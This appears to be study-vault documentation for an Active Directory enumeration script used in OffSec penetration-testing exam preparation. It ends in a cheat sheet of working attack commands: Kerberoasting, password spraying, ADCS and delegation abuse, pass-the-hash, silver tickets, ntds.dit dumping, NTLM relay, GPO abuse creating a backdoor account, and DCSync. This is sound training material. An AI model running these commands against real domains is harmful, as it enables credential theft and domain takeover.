---
tags:
  - phase/enumeration
  - phase/active-directory
  - tool/adr
  - tool/netexec
  - tool/bloodhound
  - tool/impacket
  - type/tool-docs
---

# adr.sh

## What It Is
Active Directory enumeration and attack-prep script. OffSec-focused, Kali-side only. Given valid domain credentials, it runs eight enumeration phases across users, groups, Kerberos targets, computers, SMB signing, BloodHound, shares, and sessions — then produces `summary.txt`, `next_steps.txt`, and a legacy `attack_commands.txt` alias with fully resolved copy-paste next steps.

> [!important] Enumeration only — no exploitation
> OffSec compliant. Resume-safe — re-running skips completed phases unless `--force` is passed.

---

> [!tip] Don't know the domain name yet?
> Quick null-session check: `nxc smb TARGET_IP` — the output shows the domain name.

## Usage

```bash
# Password auth (most common)
./adr.sh -d corp.local -u administrator -p Password1 -dc 10.10.10.5

# Hash auth (Pass-the-Hash)
./adr.sh -d corp.local -u jdoe -H :NTLMHASH -dc 10.10.10.5
./adr.sh -d corp.local -u jdoe -H LMHASH:NTHASH -dc 10.10.10.5

# Quick sweep (phases 1-3 only — credentials, users, Kerberos hashes)
./adr.sh -d corp.local -u jdoe -p Pass -dc 10.10.10.5 --quick

# Skip slow phases
./adr.sh -d corp.local -u jdoe -p Pass -dc 10.10.10.5 --skip-bloodhound --skip-shares

# With DC hostname (required when Kerberos tickets need FQDN)
./adr.sh -d corp.local -u jdoe -p Pass -dc 10.10.10.5 --dc-host DC01.corp.local

# Force re-run all phases
./adr.sh -d corp.local -u jdoe -p Pass -dc 10.10.10.5 --force

# Custom output directory
./adr.sh -d corp.local -u jdoe -p Pass -dc 10.10.10.5 --outdir ~/engagement/ad
```

---

## Options

| Flag | Default | Description |
|------|---------|-------------|
| `-d, --domain DOMAIN` | required | Domain name (e.g. `corp.local`) |
| `-u, --user USER` | required | Domain username |
| `-dc, --dc-ip IP` | required | Domain controller IP |
| `-p, --password PASS` | — | Plaintext password |
| `-H, --hash HASH` | — | NTLM hash: `:NTLM`, `LM:NTLM`, or plain 32-char NTLM |
| `--dc-host HOSTNAME` | — | DC hostname for Kerberos (e.g. `DC01.corp.local`) |
| `--outdir DIR` | `$TOOLKIT_ROOT/ad/<DOMAIN>/` | Output directory |
| `--threads N` | 10 (1-200) | nxc thread count |
| `--quick` | off | Phases 1–3 only |
| `--skip-bloodhound` | off | Skip BloodHound collection |
| `--skip-shares` | off | Skip share enumeration |
| `--force` | off | Re-run all phases (ignore progress.log) |
| `--chain` | off | Interactive 7-step AD kill chain walkthrough |
| `--no-color` | off | Disable ANSI colors (also: `export NO_COLOR=1`; auto-off when not a TTY) |

When launched through `sudo`, the default `$TOOLKIT_ROOT` resolves to the invoking
user's home directory instead of `/root/offsec`.

---

## Output Structure

```
$TOOLKIT_ROOT/ad/<DOMAIN>/
├── summary.txt                  # ★ READ FIRST — structured findings
├── next_steps.txt               # ★ START HERE — evidence-backed AD follow-up commands
├── attack_commands.txt          # Fully resolved copy-paste next steps
├── summary_notes.txt            # Machine-readable key=value state
├── progress.log                 # Phase tracking (START/DONE/FAIL/SKIP)
├── chain_log.txt                # Kill chain step log (--chain mode)
├── domain_context.txt           # nxc auth result + domain info
├── password_policy.txt          # Lockout threshold + complexity
├── domain_sid.txt               # Domain SID from rpcclient lsaquery
├── smb_signing.txt              # Signing status
├── smb_no_signing.txt           # Relay candidate list (--gen-relay-list)
├── users/
│   ├── all_users.txt            # Deduplicated user list (feed to sprays)
│   ├── suspicious_descriptions.txt  # ★ Cred keywords in user descriptions
│   ├── asrep_candidates.txt     # Usernames with AS-REP roastable accounts
│   ├── kerberoastable.txt       # SPN table from GetUserSPNs
│   └── users_detail.txt         # LDAP full user attributes (password auth only)
├── groups/
│   ├── all_groups.txt           # All domain groups
│   └── privileged_groups.txt    # Domain Admins, Backup Ops, RDP, Account Ops, Server Ops
├── computers/
│   ├── nxc_computers.txt        # Computer list (nxc)
│   ├── all_computers.txt        # LDAP computer details + OS versions
│   └── old_os.txt               # ★ Legacy OS (2003/2008/2012/XP/Win7) — high value
├── hashes/
│   ├── asreproast.txt           # ★ AS-REP hashes (hashcat mode 18200)
│   └── kerberoast.txt           # ★ Kerberoast hashes (hashcat mode 13100)
├── bloodhound/
│   ├── bh*.zip                  # Upload to BloodHound CE
│   └── collection_output.txt    # Collection log
├── shares/
│   ├── all_shares.txt           # Share listing
│   ├── sysvol_ls.txt            # SYSVOL top-level
│   ├── sysvol_recurse.txt       # SYSVOL recursive listing
│   ├── netlogon_ls.txt          # NETLOGON listing
│   └── sysvol_interesting.txt   # ★ Scripts, GPP, cred files in SYSVOL
└── sessions/
    ├── smb_sessions.txt         # Active SMB sessions
    └── loggedon_users.txt       # Logged-on users (flag DA sessions)
```

---

## Phases

| Phase | Name | Mode | What It Does |
|-------|------|------|-------------|
| 1 | Domain context | Always | Ping + TCP probe, credential validation via nxc, Pwn3d! check, password/lockout policy, domain SID, DNS SRV records |
| 2 | User enumeration | Always | nxc `--users-export`, rpcclient `enumdomusers`, LDAP user details + description mining (password auth only), privileged group membership |
| 3 | Kerberos attack prep | Always | AS-REP roasting (GetNPUsers), Kerberoasting (GetUserSPNs), writes hashes directly to `hashes/` |
| 4 | Computer enumeration | Standard | nxc `--computers`, LDAP computer objects + OS versions, flags legacy OS |
| 5 | SMB signing check | Standard | nxc signing check, generates NTLM relay candidate list |
| 6 | BloodHound collection | Standard | bloodhound-ce-python `-c All`, produces zip for CE upload |
| 7 | Share enumeration | Standard | nxc `--shares`, SYSVOL + NETLOGON browse, GPP/Groups.xml detection |
| 8 | Session enumeration | Standard | nxc `--smb-sessions` + `--loggedon-users`, flags privileged sessions |
| 9 | Spray cracked passwords | `--chain` | PTH spray with cracked hashes against all users × all hosts (standard mode: use `sprayr.sh --from-creds` instead) |

> [!tip] `--quick` runs phases 1–3 only — use it for a fast initial sweep then decide whether to go deeper.

---

## Key Output Files (Check in This Order)

```bash
DOMAIN=corp.local

# Always read first
cat $TOOLKIT_ROOT/ad/$DOMAIN/summary.txt
cat $TOOLKIT_ROOT/ad/$DOMAIN/next_steps.txt

# ★ High-value immediate wins
cat $TOOLKIT_ROOT/ad/$DOMAIN/users/suspicious_descriptions.txt   # Creds in descriptions
cat $TOOLKIT_ROOT/ad/$DOMAIN/hashes/asreproast.txt               # Feed to crackr.sh
cat $TOOLKIT_ROOT/ad/$DOMAIN/hashes/kerberoast.txt               # Feed to crackr.sh
cat $TOOLKIT_ROOT/ad/$DOMAIN/computers/old_os.txt                # Legacy OS targets
cat $TOOLKIT_ROOT/ad/$DOMAIN/shares/sysvol_interesting.txt       # Scripts/GPP/cred files

# Users and groups
cat $TOOLKIT_ROOT/ad/$DOMAIN/users/all_users.txt                 # For password sprays
cat $TOOLKIT_ROOT/ad/$DOMAIN/groups/privileged_groups.txt        # Who's in Domain Admins?

# BloodHound
ls $TOOLKIT_ROOT/ad/$DOMAIN/bloodhound/*.zip                     # Upload this to BH CE
```

---

## Hash Auth Notes

| Tool | Hash Support | Behavior |
|------|-------------|----------|
| nxc | ✅ | Uses NT hash only (`-H NTLMHASH`) |
| rpcclient | ✅ | Uses NT hash with `--pw-nt-hash` |
| smbclient | ✅ | Uses NT hash with `--pw-nt-hash` |
| impacket | ✅ | Uses `LM:NT` format (auto-normalized: `aad3b435...:NTHASH`) |
| ldapsearch | ❌ | No NTLM hash support — LDAP phases skipped in hash mode |

Hash input formats all accepted: `:NTLMHASH`, `LMHASH:NTHASH`, or plain 32-char NTLM.

---

## What Gets Auto-Generated in `next_steps.txt`

The script writes fully resolved commands as each phase finds something. Always review before running:

| Finding | Commands Generated |
|---------|--------------------|
| Always | `impacket-secretsdump` template |
| `Pwn3d!` / admin on DC | **Immediately** writes DCSync: `impacket-secretsdump -just-dc` + `nxc smb --ntds` |
| Domain SID obtained | Golden ticket template: `impacket-ticketer -nthash <krbtgt> -domain-sid <sid>` + `impacket-psexec -k` |
| Users collected | `nxc` password spray + hash spray against `all_users.txt` + `sprayr.sh -U all_users.txt` suggestion |
| Privileged group members | Resolves member RIDs → usernames → `groups/privileged_members_resolved.txt` + targeted spray command |
| AS-REP hashes | `hashcat -m 18200` + `crackr.sh` one-liner |
| Kerberoast hashes | `hashcat -m 13100/19600/19700` (RC4 + AES variants) + `crackr.sh` one-liner |
| SMB signing disabled | `responder` + `impacket-ntlmrelayx` with payload template |
| Groups.xml in SYSVOL | Extracts actual `cpassword` value from downloaded XML → `gpp-decrypt '<actual_value>'` (no placeholder) |
| Browser creds dumped | Parses `browser_creds.txt` for cleartext passwords → `browser_passwords.txt` + `sprayr.sh -P` command |
| BloodHound zip collected | `bloodhound-cli upload` command + 4 key post-import queries in `next_steps.txt` |
| Active privileged sessions (`PRIV_SESSIONS=YES`) | Token impersonation (Meterpreter `incognito`, `Invoke-TokenManipulation`) + targeted Kerberoast against those users |
| Legacy OS detected (`OLD_OS=YES`) | Per-OS CVE exploit commands: Win7/2008/XP → MS17-010 (`impacket-eternalblue`), 2019/Win10 → PrintNightmare (`rpcdump` check), unknown → `searchsploit` |
| Valid domain context | PowerView and SharpHound on-host enumeration commands |
| User list collected | Lockout-aware spray workflow and WinRM auth checks |
| AD computers collected | WinRM, WMI, PsExec, DCOM validation commands |
| SMB signing disabled or relay list exists | Responder + `ntlmrelayx -tf smb_no_signing.txt` commands |
| Admin on DC | DCSync, pass-the-hash, and pass-the-ticket follow-up commands |
| SYSVOL interesting files | Share loot grep and script/config review commands |

The 2025-2026 aligned matrix is still evidence-gated. `adr.sh` does not print lateral movement, relay, BloodHound, or DCSync follow-ups unless the matching phase produced a concrete artifact such as a validated context, non-empty hash file, computer list, relay list, BloodHound zip, privileged-session marker, or admin-on-DC marker.

---

## Crack the Hashes

```bash
# AS-REP (hashcat 18200) — crackr auto-detects
./crackr.sh -q -f $TOOLKIT_ROOT/ad/corp.local/hashes/asreproast.txt

# Kerberoast (hashcat 13100) — crackr auto-detects
./crackr.sh -q -f $TOOLKIT_ROOT/ad/corp.local/hashes/kerberoast.txt
```

---

## BloodHound Workflow

```bash
# 1. adr.sh collects the zip automatically in phase 6
ls $TOOLKIT_ROOT/ad/corp.local/bloodhound/*.zip

# 2. next_steps.txt has the import command already:
#    bloodhound-cli upload --path <zip> --url http://localhost:8080 --username admin --password <pass>

# 3. Or manually: Open BloodHound CE in browser → File Ingest → upload zip

# 4. Mark your current user as Owned
# 5. Run pre-built queries (next_steps.txt lists these):
#    - Shortest Path to Domain Admins from Owned Principals
#    - Find Kerberoastable Users with Path to DA
#    - Users with DCSync Rights
#    - ASREPRoastable Users
```

---

## Quick Wins the Script Flags Automatically

| Flag in `summary_notes.txt` | Meaning |
|-----------------------------|---------|
| `ADMIN_ON_DC=YES` | Current user has `Pwn3d!` on DC |
| `CRED_IN_DESC=YES` | User descriptions contain password keywords |
| `ASREP_COUNT=N` | N AS-REP roastable accounts |
| `KERB_COUNT=N` | N Kerberoastable accounts |
| `SMB_SIGNING_DISABLED=YES` | NTLM relay possible |
| `GROUPS_XML=YES` | GPP password in SYSVOL |
| `OLD_OS=YES` | Legacy OS computers present |
| `PRIV_SESSIONS=YES` | DA/admin sessions currently active |

---

## Troubleshooting

```bash
# Credential validation fails (Phase 1 aborts)
# → verify user/password/hash, check domain name is correct
nxc smb 10.10.10.5 -u user -p 'Password1' -d corp.local

# BloodHound collection fails
cat $TOOLKIT_ROOT/ad/corp.local/bloodhound/collection_output.txt
# Common cause: tool name changed — verify: which bloodhound-ce-python
pip install bloodhound-ce     # or: sudo apt install bloodhound-ce-python

# LDAP phases skipped with hash auth
# → expected behavior; use password auth for full LDAP output

# Re-run a specific phase (e.g. BloodHound failed, rest is done)
./adr.sh -d corp.local -u jdoe -p Pass -dc 10.10.10.5 --skip-bloodhound
# Then separately:
bloodhound-ce-python -c All -d corp.local -u jdoe -p Pass -ns 10.10.10.5 --zip

# Force full re-run
./adr.sh -d corp.local -u jdoe -p Pass -dc 10.10.10.5 --force

# Check what ran
cat $TOOLKIT_ROOT/ad/corp.local/progress.log
grep FAIL $TOOLKIT_ROOT/ad/corp.local/progress.log
```

---

## Required Tools

```bash
# Critical (script exits if missing)
sudo apt install netexec

# Important (phases degrade if missing)
sudo apt install impacket-scripts ldap-utils rpcclient smbclient
pip install enum4linux-ng

# Optional
pip install bloodhound-ce
# or: sudo apt install bloodhound-ce-python
```

**Tool → phase dependency:**

| Tool | Phases Used |
|------|-------------|
| nxc (netexec) | All phases (critical) |
| impacket-GetNPUsers | Phase 3 (AS-REP) |
| impacket-GetUserSPNs | Phase 3 (Kerberoast) |
| rpcclient | Phases 1, 2, 4 (domain SID, user/group/computer enum) |
| ldapsearch | Phases 2, 4 (user/computer details — password auth only) |
| smbclient | Phase 7 (SYSVOL/NETLOGON browse) |
| bloodhound-ce-python | Phase 6 |
| dig | Phase 1 (LDAP SRV check, non-critical) |

---

## Related

- [[OffSec_Exam_Methodology_Complete]] — AD set workflow (Phase 9); `orient --domain` bridges adr's output
- [[OffSec_Toolkit_Playbook]] — engagement-day run order; the AD credential loop (§4)
- [[Active_Directory]] — manual AD attack techniques
- [[OffSec_AD_Operational_Addendum]] — engagement-day AD reference
- [[OffSec_AD_Mental_Model_Bus_Review]] — decision-tree for AD attack paths
- [[crackr]] — crack the hashes from `hashes/asreproast.txt` and `hashes/kerberoast.txt`
- [[Active_Directory_PtH_PtT]] — use cracked hashes for lateral movement
- [[Tunneling_Pivoting]] — pivot to reach internal DC


## `--chain` — Interactive AD Kill Chain

Guided walkthrough mode. Presents each step with a Proceed/Skip/Quit prompt. Logs every step to `chain_log.txt` so you have a timestamped record for your report.

```bash
# Full chain walkthrough (requires -d, -u, -p/-H, -dc)
./adr.sh -d corp.local -u administrator -p Password1 -dc 10.10.10.5 --chain
```

**Steps:**

| Step | Action |
|------|--------|
| 1 | Validate foothold (nxc auth check) |
| 2 | User enum + description mining |
| 3 | Kerberoast + AS-REP roast |
| 4 | Credential dump (SAM, LSA, DPAPI, browser, chrome enum) |
| 5 | BloodHound collection |
| 6 | Pass-the-Hash spray against all users |
| 7 | Share enumeration + active sessions |

Each step prompts: `[P]roceed / [S]kip / [Q]uit`. Skip steps you've already done. Quit exits cleanly with the log intact.

```
chain_log.txt entry format:
[HH:MM:SS] Step N DONE — <description>
```

---

## What adr.sh Won't Find — Manual AD Testing

> [!important] adr.sh covers the common OffSec AD path. These are the vectors it doesn't automate — work through them when BloodHound shows no clear path or standard attacks fail.

---

### No Valid Creds Yet — Getting Your First Foothold

```bash
# AS-REP roasting WITHOUT credentials (users with pre-auth disabled)
impacket-GetNPUsers corp.local/ -dc-ip DC_IP -usersfile /usr/share/seclists/Usernames/Names/names.txt \
  -no-pass -request -format hashcat 2>/dev/null | grep -v "^$\|^Impacket\|^$"
# Or with kerbrute (faster, uses Kerberos not LDAP):
kerbrute userenum --dc DC_IP -d corp.local \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Password spraying without lockout (check password policy first)
kerbrute passwordspray --dc DC_IP -d corp.local users.txt 'Password1'
kerbrute passwordspray --dc DC_IP -d corp.local users.txt 'Welcome1'
kerbrute passwordspray --dc DC_IP -d corp.local users.txt 'Summer2024!'

# Null session LDAP (some DCs still allow anonymous LDAP read)
ldapsearch -x -H ldap://DC_IP -D '' -w '' -b 'DC=corp,DC=local' \
  '(objectClass=user)' sAMAccountName 2>/dev/null | grep sAMAccountName

# SMB null session user enum
nxc smb DC_IP -u '' -p '' --users
rpcclient -U '' -N DC_IP -c enumdomusers
```

---

### When BloodHound Shows No Path to DA

**Check for delegation abuse:**
```bash
# Find unconstrained delegation hosts (any user authenticated to these hosts = TGT captured)
impacket-findDelegation corp.local/user:pass -dc-ip DC_IP 2>/dev/null | grep Unconstrained

# Constrained delegation — can impersonate any user to the delegated service
impacket-findDelegation corp.local/user:pass -dc-ip DC_IP 2>/dev/null | grep Constrained

# Exploit constrained delegation
impacket-getST corp.local/svc_account:pass -spn cifs/SERVER.corp.local \
  -impersonate administrator -dc-ip DC_IP
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.local/administrator@SERVER.corp.local
```

**ADCS (AD Certificate Services) — check if running:**
```bash
# Check if ADCS is running (port 80/443 on an IIS server, or check services)
nxc ldap DC_IP -u user -p pass -M adcs
certipy find -u user@corp.local -p pass -dc-ip DC_IP -stdout 2>/dev/null | grep -A5 "Vulnerability"

# ESC1 — template allows user to specify SAN (Subject Alternative Name)
certipy req -u user@corp.local -p pass -dc-ip DC_IP -ca CANAME -template TEMPLATENAME \
  -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# This gives you the administrator hash — spray it with sprayr.sh --from-creds
```

**ACL-based attacks not shown in BloodHound default queries:**
```bash
# Run BloodHound query: "Find Principals with DCSync Rights"
# Also check: "Find Principals with GenericAll on Computer Objects"

# GenericAll on a user → reset their password
Set-ADAccountPassword -Identity "targetuser" -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force) -Reset
# Or via impacket:
impacket-changepasswd corp.local/youruser:yourpass@DC_IP -altuser targetuser \
  -altpass '' -newpass NewPass123!

# GenericAll on a group → add yourself to it
Add-ADGroupMember -Identity "Domain Admins" -Members "youruser"
# Or: net group "Domain Admins" youruser /add /domain

# WriteOwner on an object → take ownership first
Set-ADObject -Identity "OU=Computers,DC=corp,DC=local" -Replace @{nTSecurityDescriptor=...}
# Use PowerView for cleaner syntax:
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity youruser
Grant-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity youruser -Rights All
```

**Shadow credentials (no LAPS, no password reset):**
```bash
# Requires GenericWrite or GenericAll on a computer/user account
# python3 pywhisker.py -d corp.local -u user -p pass --target victim_computer$ --action add
# Creates a certificate → get hash via PKINIT
# impacket-gettgtpkinit corp.local/victim_computer$ -cert-pfx victim.pfx -pfx-pass pass victim.ccache
```

---

### When Kerberoast Hashes Won't Crack

```bash
# 1. Try targeted cracking with company-specific wordlist (CeWL the company website)
cewl http://company.com -d 3 -m 5 -w company_words.txt
hashcat -m 13100 kerberoast.txt company_words.txt -r /usr/share/hashcat/rules/best64.rule

# 2. If you know the service account purpose, try service-specific passwords
# (e.g., SQL service accounts often use database-related passwords)
echo -e "SQL2019!\nSQLServer2022\nDb@admin123" > targeted.txt
hashcat -m 13100 kerberoast.txt targeted.txt

# 3. Request tickets for ALL SPNs then crack offline
impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request \
  -outputfile all_kerberoast.txt 2>/dev/null
# Try cracking all of them — some accounts have weaker passwords than others

# 4. Targeted Kerberoasting — ask for RC4 ticket instead of AES
impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request \
  -usersfile spn_users.txt -etype 23 -outputfile rc4_kerberoast.txt
# RC4 (etype 23) is faster to crack than AES (etype 18)
```

---

### Pass-the-Hash / Pass-the-Ticket

```bash
# PTH — use NTLM hash directly without cracking
impacket-psexec corp.local/administrator@TARGET_IP -hashes :NTHASH
impacket-wmiexec corp.local/administrator@TARGET_IP -hashes :NTHASH
evil-winrm -i TARGET_IP -u administrator -H NTHASH

# PTT — inject a TGT/TGS ticket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass corp.local/user@TARGET_IP

# Overpass-the-Hash (use NTLM to get a TGT)
impacket-getTGT corp.local/user -hashes :NTHASH -dc-ip DC_IP
export KRB5CCNAME=user.ccache
impacket-smbexec -k -no-pass corp.local/user@TARGET_IP

# Silver Ticket — forge a TGS for ONE service using a cracked service account hash.
# Use this when Kerberoast gave you a SPN-account hash and DCSync/psexec-as-DA is blocked.
# (PEN-200 ch 23.2.4)
python3 -c 'from impacket.ntlm import compute_nthash; import sys; print(compute_nthash(sys.argv[1]).hex())' 'CRACKED_PASS'
impacket-ticketer -nthash SERVICE_NT_HASH -domain-sid DOMAIN_SID -domain corp.local \
  -spn cifs/targethost.corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass targethost.corp.local

# Shadow Copies fallback — extract ntds.dit when DCSync is blocked but you have
# a shell on the DC as local admin. (PEN-200 ch 24.2.2)
# Run on the DC (cmd as admin):
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
reg save HKLM\SYSTEM C:\Temp\SYSTEM
# Exfil to Kali (servr.sh) then dump offline:
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

---

### Coercion Attacks (When You Have a Listening Position)

When you control a system on the same network as the DC and need a Net-NTLMv2 hash for relay:

```bash
# Start responder to capture incoming hashes
sudo responder -I tun0 -dwPv

# PetitPotam — coerce authentication from DC to your machine
python3 PetitPotam.py -u '' -p '' KALI_IP DC_IP       # unauthenticated (some DCs)
python3 PetitPotam.py -u user -p pass KALI_IP DC_IP    # authenticated

# Coercer — tries multiple coercion methods
python3 Coercer.py coerce -l KALI_IP -t DC_IP -u user -p pass -d corp.local

# Relay the captured hash to another DC or member server
# (Works when SMB signing is not required — check signing status with nxc)
nxc smb TARGETS_FILE -u '' -p '' --gen-relay-list relay_targets.txt
ntlmrelayx.py -tf relay_targets.txt -smb2support --no-http-server
```

---

### GPO Abuse

```bash
# Check if your user has rights to modify a GPO (via BloodHound → "Find GPO Misconfigurations")
# PowerView:
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'Write'}

# SharpGPOAbuse — if you can write to a GPO linked to a target OU
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author corp\admin \
  --Command "cmd.exe" --Arguments "/c net user hacker Pass123! /add" \
  --GPOName "Vulnerable GPO"
# Force GP update: gpupdate /force (or wait for 90 min cycle)
```

---

### DCSync (When You Have Replication Rights)

```bash
# Check if your account has DCSync rights (BloodHound → "Find Principals with DCSync Rights")
# If yes:
impacket-secretsdump corp.local/user:pass@DC_IP       # dumps ALL domain hashes
impacket-secretsdump corp.local/user:pass@DC_IP -just-dc-user administrator

# With hash:
impacket-secretsdump corp.local/user@DC_IP -hashes :NTHASH

# After dump: spray ALL hashes
# Put NTLM hashes in hashes.txt → ./sprayr.sh --from-creds
```

---
